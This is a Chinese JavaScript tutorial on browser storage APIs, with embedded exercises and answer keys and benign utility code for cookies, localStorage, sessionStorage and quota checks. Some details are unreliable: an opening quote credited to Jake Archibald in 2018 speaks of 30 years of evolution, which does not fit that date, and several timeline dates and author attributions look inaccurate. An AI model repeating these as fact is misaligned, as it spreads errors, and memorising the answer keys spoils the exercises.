---
order: 63
title: Web存储API
module: javascript
category: JavaScript
tags:
  - JavaScript
  - Web存储
  - localStorage
  - sessionStorage
  - Cookie
  - IndexedDB
  - 浏览器存储
difficulty: intermediate
description: 浏览器端存储机制的形式语义、安全模型、工程实践与生产级应用
author: fanquanpp
updated: '2026-07-20'
related:
  - javascript/浏览器对象模型
  - javascript/网络请求API
  - javascript/索引数据库
  - javascript/时间API
  - javascript/ServiceWorker
prerequisites:
  - javascript/语法速查
  - javascript/浏览器对象模型
  - javascript/Promise与async
learningObjectives:
  - '{''remember'': ''复述 Cookie、localStorage、sessionStorage、IndexedDB 的容量限制、生命周期与 API 形式，及 Web Storage 规范的标准化历程''}'
  - '{''understand'': ''解释同源策略对存储的影响、Cookie 的安全属性（Secure、HttpOnly、SameSite）、Storage 事件机制与浏览器存储隔离模型''}'
  - '{''apply'': ''编写生产级存储工具库，包括 JSON 序列化、TTL 过期机制、命名空间隔离、跨标签页同步、错误处理与降级方案''}'
  - '{''analyze'': ''对比 Cookie、Web Storage、IndexedDB 在容量、性能、API 复杂度、安全性上的差异，识别各自适用场景''}'
  - '{''evaluate'': ''评估 XSS、CSRF、追踪等安全风险，给出防御策略与同站/跨站 Cookie 配置方案''}'
  - '{''create'': ''设计离线优先（offline-first）应用的存储架构，结合 Service Worker、Cache API、IndexedDB 实现可信赖的离线体验''}'
exercises:
  - id: ex-webstorage-01
    type: fill-blank
    cognitiveLevel: remember
    question: Web Storage 包含 localStorage 与 ______ 两种机制，前者生命周期为 ______，后者生命周期为标签页关闭。
    hint: 前者为 sessionStorage；后者生命周期分别为永久与标签页关闭
    answer: sessionStorage,永久
    answers:
      - sessionStorage
      - 永久
    blankCount: 2
    caseSensitive: false
    difficulty: 1
    estimatedTime: 2
  - id: ex-webstorage-02
    type: fill-blank
    cognitiveLevel: understand
    question: Cookie 的 ______ 属性可防止 JavaScript 通过 document.cookie 访问，从而防御 ______ 攻击；______ 属性限制 Cookie 仅在 HTTPS 连接下发送。
    hint: 前者为 HttpOnly；中者为 XSS；后者为 Secure
    answer: HttpOnly,XSS,Secure
    answers:
      - HttpOnly
      - XSS
      - Secure
    blankCount: 3
    caseSensitive: false
    difficulty: 2
    estimatedTime: 4
  - id: ex-webstorage-03
    type: choice
    cognitiveLevel: understand
    question: 下列关于 localStorage 与 sessionStorage 区别的描述，哪项是错误的？
    options:
      - localStorage 永久存储，sessionStorage 在标签页关闭时清除
      - 二者均遵循同源策略，不同源之间数据相互隔离
      - localStorage 容量通常为 5-10MB，sessionStorage 容量与之相同
      - sessionStorage 在同一标签页的不同 iframe 中共享
    correctIndex: 3
    multiple: false
    difficulty: 3
    explanation: sessionStorage 不在 iframe 之间共享。每个浏览上下文（browsing context）有独立的 sessionStorage，iframe 是独立的浏览上下文，故其 sessionStorage 与父页面隔离。
    answer: D
  - id: ex-webstorage-04
    type: choice
    cognitiveLevel: analyze
    question: 在以下场景中，哪种存储机制最合适保存用户的敏感会话令牌（session token）？
    options:
      - localStorage，便于跨标签页访问
      - sessionStorage，标签页关闭自动清除，降低泄漏风险
      - Cookie 配合 Secure、HttpOnly、SameSite=Strict 属性
      - IndexedDB，存储结构化数据
    correctIndex: 2
    multiple: false
    difficulty: 4
    explanation: 敏感会话令牌应使用 Cookie 并配合 Secure（仅 HTTPS）、HttpOnly（防 XSS 读取）、SameSite=Strict（防 CSRF）三重防护。localStorage 与 sessionStorage 均可被 JavaScript 访问，存在 XSS 风险；IndexedDB 过于复杂且同样可被 JS 访问。
    answer: C
  - id: ex-webstorage-05
    type: code-fix
    cognitiveLevel: apply
    question: 以下函数意图将对象存入 localStorage 并设置 1 小时过期，但存在缺陷。请修复。
    buggyCode: |
      function setWithExpiry(key, value, ttl) {
        localStorage.setItem(key, JSON.stringify(value));
        localStorage.setItem(key + '_ttl', Date.now() + ttl);
      }
      function getWithExpiry(key) {
        const value = localStorage.getItem(key);
        const ttl = localStorage.getItem(key + '_ttl');
        if (Date.now() > ttl) {
          localStorage.removeItem(key);
          return null;
        }
        return JSON.parse(value);
      }
      setWithExpiry('user', { name: 'Alice' }, 3600000);
    fixedCode: |
      function setWithExpiry(key, value, ttl) {
        const item = {
          value: value,
          expiry: Date.now() + ttl,
        };
        localStorage.setItem(key, JSON.stringify(item));
      }
      function getWithExpiry(key) {
        const raw = localStorage.getItem(key);
        if (!raw) return null;
        try {
          const item = JSON.parse(raw);
          if (Date.now() > item.expiry) {
            localStorage.removeItem(key);
            return null;
          }
          return item.value;
        } catch (e) {
          console.error('JSON parse failed:', e);
          localStorage.removeItem(key);
          return null;
        }
      }
      setWithExpiry('user', { name: 'Alice' }, 3600000);
    errorDescription: 原实现将值与 TTL 分开存储，需两次 setItem 调用，原子性差；且 getItem 在键不存在时返回 null，Number(null) 为 0 导致 Date.now() > 0 永远为真。修复后合并为单个对象存储，并添加 try-catch 处理 JSON 解析异常。
    language: javascript
    answer: 合并为单对象存储并添加异常处理
    difficulty: 3
    estimatedTime: 6
  - id: ex-webstorage-06
    type: code-fix
    cognitiveLevel: evaluate
    question: 以下跨标签页同步函数无法在所有浏览器中正常工作，且未处理 Storage 事件。请修复。
    buggyCode: |
      function syncState(state) {
        localStorage.setItem('appState', JSON.stringify(state));
      }
      window.addEventListener('storage', function (e) {
        if (e.key === 'appState') {
          updateUI(e.newValue);
        }
      });
    fixedCode: |
      function syncState(state) {
        try {
          localStorage.setItem('appState', JSON.stringify(state));
          // 同标签页 storage 事件不触发，需手动派发
          window.dispatchEvent(new StorageEvent('storage', {
            key: 'appState',
            newValue: JSON.stringify(state),
          }));
        } catch (e) {
          console.error('Storage failed:', e);
        }
      }
      window.addEventListener('storage', function (e) {
        if (e.key === 'appState' && e.newValue !== null) {
          try {
            const state = JSON.parse(e.newValue);
            updateUI(state);
          } catch (e) {
            console.error('Parse failed:', e);
          }
        }
      });
    errorDescription: 原实现仅在 setItem 时调用，不会触发本标签页的 storage 事件（storage 事件仅在相同源的其他标签页触发）。修复后手动派发 StorageEvent，并对 JSON 解析添加异常处理。
    language: javascript
    answer: 手动派发 StorageEvent 并添加异常处理
    difficulty: 4
    estimatedTime: 8
  - id: ex-webstorage-07
    type: open-ended
    cognitiveLevel: create
    question: 你正在设计一个离线优先的笔记应用，要求支持离线编辑、跨设备同步、冲突解决。请论述如何组合使用 Service Worker、Cache API、IndexedDB、localStorage，包括：(1) 离线缓存策略；(2) 数据同步模型（last-write-wins vs CRDT）；(3) 冲突检测与解决；(4) 存储容量管理；(5) 数据迁移与版本升级；(6) 隐私与安全考虑。给出架构设计与示例代码。
    keyPoints:
      - 提出分层存储架构（Cache API 缓存资源、IndexedDB 存储数据、localStorage 存配置）
      - 论述 Service Worker 拦截网络请求实现离线优先
      - 处理冲突解决的两种策略（LWW 简单但易丢数据，CRDT 复杂但保证收敛）
      - 给出存储配额检测与清理策略（navigator.storage.estimate）
      - 设计 IndexedDB schema 版本升级流程
      - 处理敏感数据加密（WebCrypto API）
    answer: 开放性论述题，需覆盖上述关键点
    minWords: 500
    difficulty: 5
    estimatedTime: 35
references:
  - type: standard
    authors:
      - Ian Hickson
    year: 2016
    title: 'Web Storage (Second Edition) - W3C Recommendation'
    venue: W3C
    url: https://www.w3.org/TR/webstorage/
  - type: standard
    authors:
      - Mike West
    year: 2026
    title: 'HTTP State Management Mechanism (RFC 6265bis)'
    venue: IETF
    url: https://datatracker.ietf.org/doc/html/rfc6265bis
  - type: standard
    authors:
      - Anne van Kesteren
    year: 2026
    title: 'Storage Standard - Living Standard'
    venue: WHATWG
    url: https://storage.spec.whatwg.org/
  - type: standard
    authors:
      - Nikhil Marathe
      - Jonas Sicking
    year: 2026
    title: 'Indexed Database API 3.0'
    venue: W3C
    url: https://www.w3.org/TR/IndexedDB-3/
  - type: book
    authors:
      - David Flanagan
    year: 2020
    title: 'JavaScript: The Definitive Guide (7th Edition)'
    venue: O'Reilly Media
    pages: '1-704'
    doi: 10.5555/3372471
  - type: book
    authors:
      - Marijn Haverbeke
    year: 2019
    title: 'Eloquent JavaScript (3rd Edition)'
    venue: No Starch Press
    pages: '1-448'
    url: https://eloquentjavascript.net/
  - type: conference
    authors:
      - Adam Barth
    year: 2011
    title: 'HTTP State Management Mechanism'
    venue: IETF RFC 6265
    url: https://datatracker.ietf.org/doc/html/rfc6265
  - type: documentation
    authors:
      - MDN Web Docs
    year: 2025
    title: 'Web Storage API'
    venue: Mozilla Developer Network
    url: https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API
  - type: website
    authors:
      - Jake Archibald
    year: 2018
    title: 'Storage for the web'
    venue: web.dev
    url: https://web.dev/articles/storage-for-the-web
    accessedDate: '2026-07-20'
etymology:
  - term: Cookie
    english: Cookie
    origin: 源自 "magic cookie" 一词，最早由 UNIX 程序员使用，指程序间传递的不透明令牌。1994 年网景公司的 Lou Montulli 将其引入 HTTP 协议，用于解决电商购物车状态保持问题。词源说法不一，一说源自 fortune cookie（签语饼），象征"内含信息"
  - term: localStorage
    english: localStorage
    origin: 由 Web Storage 规范（HTML5 草案）引入，2009 年首次在 Firefox 3.5 与 IE 8 中实现。"local" 强调其持久化特性，与 sessionStorage 的会话级生命周期相对
  - term: IndexedDB
    english: Indexed Database API
    origin: 由 Oracle 的 Nikhil Marathe 与 Mozilla 的 Jonas Sicking 主导设计，2015 年成为 W3C 推荐标准。名称中的 "Indexed" 强调其索引查询能力，区别于简单的键值存储（localStorage）
lastReviewed: 2026-07-20
reviewer: FANDEX Content Engineering Team
estimatedReadingTime: 50
---

# Web存储API

## 0. 学习导言

> 「Web 存储是浏览器从『无状态终端』迈向『应用平台』的关键基石。从 1994 年 Cookie 的诞生解决状态保持，到 2009 年 Web Storage 简化键值存储，再到 2015 年 IndexedDB 提供完整的事务型数据库，Web 平台的存储能力经历了 30 年的演进。」
>
> —— Jake Archibald, Google Chrome 团队, 2018

本篇文档面向已掌握 JavaScript 基础（异步编程、Promise、对象操作）的开发者，深入讲解浏览器端四类存储机制：**Cookie**、**localStorage**、**sessionStorage**、**IndexedDB**。这些机制各自承担不同的存储职责，从会话状态保持到结构化数据持久化，构成了现代 Web 应用的存储基础设施。

完成本篇学习后，你将能够：

1. 准确描述四种存储机制的容量限制、生命周期、API 形式与安全模型；
2. 编写生产级存储工具库，包括 JSON 序列化、TTL 过期、命名空间隔离、跨标签页同步；
3. 对比各机制在容量、性能、API 复杂度、安全性上的差异，识别适用场景；
4. 评估 XSS、CSRF、追踪等安全风险，给出防御策略与 Cookie 安全配置；
5. 设计离线优先应用的存储架构，结合 Service Worker 与 Cache API 实现可信赖的离线体验；
6. 处理存储配额检测、数据迁移、版本升级等工程化问题。

---

## 1. 学习目标（Bloom 分类法）

本篇严格遵循 Bloom 修订版认知层次框架（Anderson & Krathwohl, 2001），按由低到高六个层次组织学习目标：

| Bloom 层次 | 学习目标 | 对应章节 |
| ---------- | -------- | -------- |
| Remember（记忆） | 复述四种存储机制的容量、生命周期与 API | 第 2 章 |
| Understand（理解） | 解释同源策略、Cookie 安全属性、Storage 事件机制 | 第 3 章 |
| Apply（应用） | 编写生产级存储工具库、跨标签页同步、TTL 过期 | 第 4-5 章 |
| Analyze（分析） | 对比各机制差异，识别适用场景 | 第 6 章 |
| Evaluate（评价） | 评估安全风险，给出防御策略 | 第 8 章 |
| Create（创造） | 设计离线优先应用存储架构 | 第 10 章 |

---

## 2. 历史动机

### 2.1 Web 存储演进时间线

Web 存储机制经历了从「状态保持」到「离线优先」的长期演进：

| 年份 | 事件 | 关键人物/组织 |
| ---- | ---- | -------------- |
| 1994 | Lou Montulli 发明 HTTP Cookie，解决电商购物车状态 | Lou Montulli, Netscape |
| 1995 | Internet Explorer 4 引入 userData Behavior（IE 专有存储） | Microsoft |
| 1997 | RFC 2109 标准化 Cookie 协议 | IETF |
| 2002 | Flash 6 引入 SharedObject（Flash Cookie） | Macromedia |
| 2007 | Dojo Toolkit 提供 dojox.storage 抽象层 | Alex Russell |
| 2009 | HTML5 Web Storage 草案发布，IE 8 首次实现 localStorage | W3C, Microsoft |
| 2009 | Firefox 3.5 实现 localStorage 与 sessionStorage | Mozilla |
| 2010 | IndexedDB 草案发布，由 Oracle 与 Mozilla 主导 | W3C |
| 2011 | Chrome 11 实现 IndexedDB | Google |
| 2013 | Service Worker 概念提出，Alex Russell 主导 | Alex Russell |
| 2014 | Service Worker 在 Chrome 40 落地 | Google |
| 2015 | IndexedDB 1.0 成为 W3C 推荐标准 | W3C |
| 2015 | Cache API 随 Service Worker 标准化 | W3C |
| 2016 | Web Storage 第二版成为 W3C 推荐标准 | W3C |
| 2018 | Storage API 引用 navigator.storage.estimate() | W3C |
| 2021 | IndexedDB 3.0 草案发布，支持 Promise API | W3C |
| 2023 | Cookie 第三方限制在 Chrome 全面实施 | Google |
| 2024 | Storage Access API 标准化，跨站存储访问 | W3C |
| 2026 | IndexedDB 3.0 推荐标准，原生 Promise API | W3C |

### 2.2 状态保持的痛点

在 Cookie 之前，Web 应用面临严重的状态保持问题：

```javascript
// 痛点 1：HTTP 协议无状态
// 每次请求独立，服务器无法识别同一用户的多次请求
fetch('/cart');  // 第一次请求
fetch('/cart');  // 第二次请求 —— 服务器认为是不同用户

// 痛点 2：Cookie 容量极小
// 单个 Cookie 4KB 限制，无法存储复杂结构化数据
document.cookie = 'cart=' + JSON.stringify({
  items: [
    { id: 1, name: 'Product A', quantity: 2, price: 100 },
    { id: 2, name: 'Product B', quantity: 1, price: 200 },
    // ... 超过 4KB 后被截断
  ]
});  // 数据丢失！

// 痛点 3：Cookie 随每个 HTTP 请求发送，浪费带宽
// 即使访问静态资源（图片、CSS），也会携带所有 Cookie
fetch('/images/logo.png');  // 携带所有 Cookie，浪费带宽

// 痛点 4：Cookie API 设计糟糕
// document.cookie 是字符串拼接，操作繁琐
document.cookie = 'user=Alice';
document.cookie = 'theme=dark';
// 读取需手动解析
const cookies = document.cookie.split('; ').reduce((acc, pair) => {
  const [key, value] = pair.split('=');
  acc[key] = value;
  return acc;
}, {});
```

Web Storage 与 IndexedDB 的引入，正是为了解决上述痛点——**让浏览器具备真正的客户端存储能力**。

### 2.3 关键人物与原始规范

Web 存储规范的奠基者包括：

- **Lou Montulli**（1969-）：美国程序员，1994 年在网景公司发明 HTTP Cookie，灵感源自 UNIX 的 "magic cookie"。Cookie 最初用于解决 Netscape 电商网站的购物车状态保持问题。

- **Ian Hickson**（1978-）：英国程序员，HTML5 规范的主笔，2007 年在 HTML5 草案中提出 Web Storage API（localStorage 与 sessionStorage），后独立为 Web Storage 规范。

- **Jonas Sicking**（1978-）：Mozilla 的核心工程师，IndexedDB 规范的主导者之一，主张事务型 NoSQL 数据库而非简单的 SQL 子集。

- **Alex Russell**：Google Chrome 团队工程师，2013 年提出 Service Worker 概念，将离线优先（offline-first）理念引入 Web 平台。

### 2.4 存储机制概览

下表对比四种主要存储机制：

| 机制 | 容量 | 生命周期 | API 形式 | 随请求发送 | 异步 |
| ---- | ---- | -------- | -------- | ---------- | ---- |
| Cookie | ~4KB | 可设过期 | 字符串 | 是 | 否 |
| localStorage | 5-10MB | 永久 | 键值对 | 否 | 否 |
| sessionStorage | 5-10MB | 标签页关闭 | 键值对 | 否 | 否 |
| IndexedDB | 数百MB-数GB | 永久 | NoSQL 事务 | 否 | 是 |

### 2.5 与其他 Web API 的关系

Web 存储与以下 API 协同工作：

| API | 协同关系 |
| --- | -------- |
| Service Worker | 拦截网络请求，配合 Cache API 实现离线优先 |
| Cache API | 缓存 Response 对象，用于离线访问 |
| Web Workers | 在后台线程中访问 IndexedDB，避免阻塞主线程 |
| Fetch API | 配合 Cookie 属性（credentials）控制 Cookie 发送 |
| WebCrypto API | 加密敏感数据后再存储 |
| Storage API | 检测存储配额、请求持久化存储 |

---

## 3. 形式化定义

### 3.1 同源策略

Web 存储遵循**同源策略（Same-Origin Policy）**，相同源的页面共享存储，不同源相互隔离。源（origin）由三元组定义：

$$
\text{origin} = \langle \text{scheme}, \text{host}, \text{port} \rangle
$$

两个 URL 同源当且仅当：

$$
\text{origin}(u_1) = \text{origin}(u_2) \iff \text{scheme}_1 = \text{scheme}_2 \land \text{host}_1 = \text{host}_2 \land \text{port}_1 = \text{port}_2
$$

### 3.2 存储隔离模型

浏览器存储采用分层隔离模型：

$$
\text{Storage} = \bigcup_{\text{origin} \in \text{Origins}} \text{Storage}_{\text{origin}}
$$

每个源拥有独立的存储空间，源之间不可互访。同一源内：

$$
\text{Storage}_{\text{origin}} = \text{Cookie}_{\text{origin}} \cup \text{LocalStorage}_{\text{origin}} \cup \text{SessionStorage}_{\text{origin}} \cup \text{IndexedDB}_{\text{origin}}
$$

### 3.3 Cookie 形式定义

Cookie 是 (name, value, attributes) 三元组：

$$
\text{Cookie} = \langle \text{name}, \text{value}, \text{attributes} \rangle
$$

其中 attributes 包括：

- `Domain`：Cookie 可见的域
- `Path`：Cookie 可见的路径
- `Expires` / `Max-Age`：过期时间
- `Secure`：仅 HTTPS 发送
- `HttpOnly`：JavaScript 不可访问
- `SameSite`：跨站发送策略（Strict / Lax / None）

### 3.4 localStorage 形式语义

localStorage 是持久的键值存储：

$$
\text{localStorage}: \text{String} \to \text{String} \cup \{\text{null}\}
$$

操作语义：

$$
\text{setItem}(k, v): \text{localStorage} \leftarrow \text{localStorage} \cup \{(k, v)\}
$$

$$
\text{getItem}(k) = \begin{cases}
v & \text{if } (k, v) \in \text{localStorage} \\
\text{null} & \text{otherwise}
\end{cases}
$$

### 3.5 sessionStorage 浏览上下文隔离

sessionStorage 在浏览上下文（browsing context）级别隔离：

$$
\text{sessionStorage}_{\text{context}_1} \neq \text{sessionStorage}_{\text{context}_2}
$$

即使两个标签页同源，若分属不同浏览上下文（如新标签页、新窗口），其 sessionStorage 相互隔离。

### 3.6 IndexedDB 事务模型

IndexedDB 采用 ACID 事务模型：

$$
\text{Transaction} = \langle \text{stores}, \text{mode}, \text{operations} \rangle
$$

其中：

- `stores`：事务涉及的对象存储
- `mode`：`readonly`、`readwrite`、`versionchange`
- `operations`：事务内的操作序列

事务满足原子性：所有操作要么全部成功，要么全部回滚。

### 3.7 Storage 事件机制

当 localStorage 被修改时，相同源的其他标签页会收到 `storage` 事件：

$$
\text{Event} = \langle \text{key}, \text{oldValue}, \text{newValue}, \text{url}, \text{storageArea} \rangle
$$

注意：**事件仅在相同源的其他标签页触发，不在修改自身的标签页触发**。

---

## 4. Cookie 详解

### 4.1 Cookie 基础操作

```javascript
/**
 * 设置 Cookie
 * @param {string} name Cookie 名称
 * @param {string} value Cookie 值
 * @param {Object} options 配置选项
 */
function setCookie(name, value, options = {}) {
  const {
    maxAge = 86400,        // 默认 1 天（秒）
    path = '/',
    domain = '',
    secure = true,
    httpOnly = false,      // JS 设置无法真正成为 HttpOnly（需服务器设置）
    sameSite = 'Lax',
  } = options;

  let cookie = `${encodeURIComponent(name)}=${encodeURIComponent(value)}`;
  cookie += `; Max-Age=${maxAge}`;
  cookie += `; Path=${path}`;
  if (domain) cookie += `; Domain=${domain}`;
  if (secure) cookie += '; Secure';
  if (sameSite) cookie += `; SameSite=${sameSite}`;
  // 注意：HttpOnly 只能由服务器设置，JS 无法设置

  document.cookie = cookie;
}

/**
 * 获取所有 Cookie 为对象
 * @returns {Object} Cookie 键值对
 */
function getCookies() {
  return document.cookie.split('; ').reduce((acc, pair) => {
    if (!pair) return acc;
    const [key, value] = pair.split('=');
    acc[decodeURIComponent(key)] = decodeURIComponent(value || '');
    return acc;
  }, {});
}

/**
 * 获取指定 Cookie
 * @param {string} name Cookie 名称
 * @returns {string|null} Cookie 值
 */
function getCookie(name) {
  return getCookies()[name] || null;
}

/**
 * 删除 Cookie
 * @param {string} name Cookie 名称
 * @param {string} path Cookie 路径
 */
function deleteCookie(name, path = '/') {
  document.cookie = `${encodeURIComponent(name)}=; Max-Age=0; Path=${path}`;
}

// 使用示例
setCookie('user', 'Alice', { maxAge: 3600, secure: true, sameSite: 'Strict' });
console.log(getCookie('user'));  // 'Alice'
deleteCookie('user');
```

### 4.2 Cookie 安全属性

| 属性 | 作用 | 推荐值 |
| ---- | ---- | ------ |
| Secure | 仅 HTTPS 发送 | true |
| HttpOnly | 防 JS 读取（防 XSS） | true（会话 Cookie 必需） |
| SameSite=Strict | 完全禁止跨站发送 | 会话 Cookie 推荐 |
| SameSite=Lax | 顶层导航允许发送 | 默认值，平衡安全与可用性 |
| SameSite=None | 允许跨站发送 | 需配合 Secure，仅第三方 Cookie |
| Domain | 指定可见域 | 谨慎使用，避免过宽 |

### 4.3 SameSite 属性详解

```javascript
// SameSite=Strict：完全禁止跨站发送
// 即使从其他网站点击链接进入，也不携带 Cookie
setCookie('session', 'token', { sameSite: 'Strict' });
// 用户从 Google 搜索结果点击进入站点，首次访问无 Cookie（需重新登录）

// SameSite=Lax：顶层导航（GET 请求）允许发送
// 平衡安全与可用性，Chrome 默认值
setCookie('session', 'token', { sameSite: 'Lax' });
// 用户从 Google 点击链接进入，会携带 Cookie（GET 请求）

// SameSite=None：允许跨站发送
// 需配合 Secure，仅第三方 Cookie 使用
setCookie('tracking', 'id', { sameSite: 'None', secure: true });
// 第三方追踪、嵌入式应用场景
```

### 4.4 Cookie 编码与特殊字符

```javascript
// Cookie 值中不能包含分号、逗号、空格等特殊字符
// 需使用 encodeURIComponent 编码

// 错误：包含特殊字符
document.cookie = 'data=name=Alice; age=30';  // 解析错误
document.cookie = 'json={"name":"Alice"}';    // 解析错误

// 正确：使用编码
document.cookie = `data=${encodeURIComponent('name=Alice; age=30')}`;
document.cookie = `json=${encodeURIComponent(JSON.stringify({ name: 'Alice' }))}`;

// 读取时解码
const cookies = getCookies();
const data = decodeURIComponent(cookies.data);
const json = JSON.parse(decodeURIComponent(cookies.json));
```

### 4.5 第三方 Cookie

第三方 Cookie 指当前页面引用的**非同源**域设置的 Cookie：

```javascript
// 用户访问 site.com，页面包含 iframe 加载 ad.com
// iframe 中的脚本可设置 ad.com 的 Cookie
// 用户访问其他包含 ad.com 的站点时，ad.com 可读取该 Cookie
// 这就是跨站追踪的基础

// 2024 年起，Chrome 默认禁用第三方 Cookie
// 开发者需使用替代方案：
// 1. Storage Access API（请求用户授权）
// 2. Federated Credential Management API（联邦认证）
// 3. Topics API（基于兴趣的广告）
// 4. First-Party Sets（同主体站点共享存储）
```

---

## 5. localStorage 与 sessionStorage

### 5.1 基础 API

```javascript
// localStorage 基础操作
localStorage.setItem('name', 'Alice');
localStorage.getItem('name');        // 'Alice'
localStorage.removeItem('name');
localStorage.clear();

// 遍历所有键
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key);
  console.log(key, value);
}

// sessionStorage API 与 localStorage 完全相同
sessionStorage.setItem('temp', 'value');
sessionStorage.getItem('temp');
```

### 5.2 JSON 序列化工具

```javascript
/**
 * 安全的 JSON 存储工具
 * 自动处理序列化、反序列化、异常
 */
const jsonStorage = {
  /**
   * 存储对象（自动 JSON 序列化）
   */
  set(key, value) {
    try {
      const serialized = JSON.stringify(value);
      localStorage.setItem(key, serialized);
      return true;
    } catch (e) {
      console.error(`Storage set failed for key "${key}":`, e);
      return false;
    }
  },

  /**
   * 读取对象（自动 JSON 反序列化）
   */
  get(key, defaultValue = null) {
    try {
      const raw = localStorage.getItem(key);
      if (raw === null) return defaultValue;
      return JSON.parse(raw);
    } catch (e) {
      console.error(`Storage get failed for key "${key}":`, e);
      // 解析失败时清除损坏的数据
      localStorage.removeItem(key);
      return defaultValue;
    }
  },

  /**
   * 删除
   */
  remove(key) {
    localStorage.removeItem(key);
  },

  /**
   * 清空所有
   */
  clear() {
    localStorage.clear();
  },

  /**
   * 检查键是否存在
   */
  has(key) {
    return localStorage.getItem(key) !== null;
  },

  /**
   * 获取所有键
   */
  keys() {
    return Object.keys(localStorage);
  },

  /**
   * 获取所有键值对
   */
  entries() {
    const result = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      result[key] = this.get(key);
    }
    return result;
  },
};

// 使用
jsonStorage.set('user', { name: 'Alice', age: 30 });
const user = jsonStorage.get('user', { name: '', age: 0 });
console.log(user);  // { name: 'Alice', age: 30 }
```

### 5.3 TTL 过期机制

```javascript
/**
 * 带 TTL 的存储工具
 * 支持设置过期时间，到期自动清除
 */
const ttlStorage = {
  /**
   * 存储带过期时间的数据
   * @param {string} key 键
   * @param {*} value 值
   * @param {number} ttl 过期时间（毫秒）
   */
  set(key, value, ttl = 86400000) {
    const item = {
      value,
      expiry: Date.now() + ttl,
      createdAt: Date.now(),
    };
    return jsonStorage.set(key, item);
  },

  /**
   * 读取数据，过期则返回 null 并清除
   */
  get(key, defaultValue = null) {
    const item = jsonStorage.get(key);
    if (!item) return defaultValue;

    // 兼容未包装的旧数据
    if (item.expiry === undefined) {
      return item;
    }

    // 检查过期
    if (Date.now() > item.expiry) {
      localStorage.removeItem(key);
      return defaultValue;
    }

    return item.value;
  },

  /**
   * 获取剩余有效时间（毫秒）
   */
  getTTL(key) {
    const item = jsonStorage.get(key);
    if (!item || item.expiry === undefined) return null;
    return Math.max(0, item.expiry - Date.now());
  },

  /**
   * 续期
   */
  renew(key, ttl) {
    const value = this.get(key);
    if (value !== null) {
      this.set(key, value, ttl);
      return true;
    }
    return false;
  },
};

// 使用：缓存 5 分钟
ttlStorage.set('apiCache', { data: '...' }, 5 * 60 * 1000);
const cached = ttlStorage.get('apiCache');
```

### 5.4 命名空间隔离

```javascript
/**
 * 命名空间存储工具
 * 避免多模块共享 localStorage 时的键冲突
 */
class NamespacedStorage {
  constructor(namespace) {
    this.namespace = namespace;
    this.prefix = `${namespace}:`;
  }

  _key(key) {
    return `${this.prefix}${key}`;
  }

  set(key, value) {
    return jsonStorage.set(this._key(key), value);
  }

  get(key, defaultValue = null) {
    return jsonStorage.get(this._key(key), defaultValue);
  }

  remove(key) {
    localStorage.removeItem(this._key(key));
  }

  /**
   * 清空当前命名空间的所有键
   */
  clearNamespace() {
    const keysToRemove = [];
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key.startsWith(this.prefix)) {
        keysToRemove.push(key);
      }
    }
    keysToRemove.forEach(key => localStorage.removeItem(key));
  }

  /**
   * 获取当前命名空间所有键
   */
  keys() {
    const result = [];
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key.startsWith(this.prefix)) {
        result.push(key.slice(this.prefix.length));
      }
    }
    return result;
  }
}

// 使用
const authStorage = new NamespacedStorage('auth');
const cacheStorage = new NamespacedStorage('cache');

authStorage.set('token', 'abc123');
cacheStorage.set('users', [{ name: 'Alice' }]);

console.log(authStorage.get('token'));  // 'abc123'
console.log(cacheStorage.get('users')); // [{ name: 'Alice' }]

// 清空 auth 命名空间不影响 cache
authStorage.clearNamespace();
console.log(cacheStorage.get('users')); // 依然存在
```

### 5.5 跨标签页同步

```javascript
/**
 * 跨标签页状态同步工具
 * 基于 storage 事件实现
 */
class CrossTabSync {
  constructor(key) {
    this.key = key;
    this.listeners = new Set();

    // 监听 storage 事件
    window.addEventListener('storage', (e) => {
      if (e.key === this.key && e.newValue !== null) {
        try {
          const state = JSON.parse(e.newValue);
          this.listeners.forEach(fn => fn(state, e));
        } catch (err) {
          console.error('Cross-tab sync parse error:', err);
        }
      }
    });
  }

  /**
   * 更新状态（会通知其他标签页）
   */
  setState(state) {
    localStorage.setItem(this.key, JSON.stringify(state));
    // storage 事件不会在本标签页触发，需手动通知
    this.listeners.forEach(fn => fn(state, null));
  }

  /**
   * 获取当前状态
   */
  getState() {
    const raw = localStorage.getItem(this.key);
    return raw ? JSON.parse(raw) : null;
  }

  /**
   * 订阅状态变化
   */
  subscribe(listener) {
    this.listeners.add(listener);
    return () => this.listeners.delete(listener);
  }

  /**
   * 广播消息（仅通知其他标签页）
   */
  broadcast(message) {
    const state = {
      message,
      timestamp: Date.now(),
      source: Math.random().toString(36),  // 唯一标识
    };
    this.setState(state);
  }
}

// 使用示例：跨标签页通知
const sync = new CrossTabSync('appState');

// 标签页 A
sync.subscribe((state, event) => {
  if (state) {
    console.log('收到消息:', state.message);
    // 更新 UI
    document.title = state.message;
  }
});

// 标签页 B
sync.broadcast('来自标签页 B 的问候');
```

### 5.6 容量检测与配额管理

```javascript
/**
 * 存储配额检测工具
 */
const storageEstimate = {
  /**
   * 获取存储配额估算
   */
  async getEstimate() {
    if (navigator.storage && navigator.storage.estimate) {
      const estimate = await navigator.storage.estimate();
      return {
        usage: estimate.usage,
        quota: estimate.quota,
        usageDetails: estimate.usageDetails || {},
        percentage: (estimate.usage / estimate.quota * 100).toFixed(2),
      };
    }
    return null;
  },

  /**
   * 请求持久化存储
   * 防止浏览器在低存储空间时自动清除
   */
  async requestPersistent() {
    if (navigator.storage && navigator.storage.persist) {
      const isPersisted = await navigator.storage.persisted();
      if (isPersisted) return true;
      return await navigator.storage.persist();
    }
    return false;
  },

  /**
   * 检查是否已持久化
   */
  async isPersisted() {
    if (navigator.storage && navigator.storage.persisted) {
      return await navigator.storage.persisted();
    }
    return false;
  },

  /**
   * 测试 localStorage 容量上限
   */
  testLocalStorageLimit() {
    const testKey = '__storage_test__';
    let size = 0;
    const chunk = 'a'.repeat(1024);  // 1KB

    try {
      while (true) {
        localStorage.setItem(testKey, 'a'.repeat(size + chunk.length));
        size += chunk.length;
      }
    } catch (e) {
      // 达到上限
      localStorage.removeItem(testKey);
      return {
        bytes: size,
        kb: Math.round(size / 1024),
        mb: (size / 1024 / 1024).toFixed(2),
      };
    }
  },
};

// 使用
async function checkStorage() {
  const estimate = await storageEstimate.getEstimate();
  console.log('存储配额:', estimate);

  const persisted = await storageEstimate.requestPersistent();
  console.log('已持久化:', persisted);
}
```

---

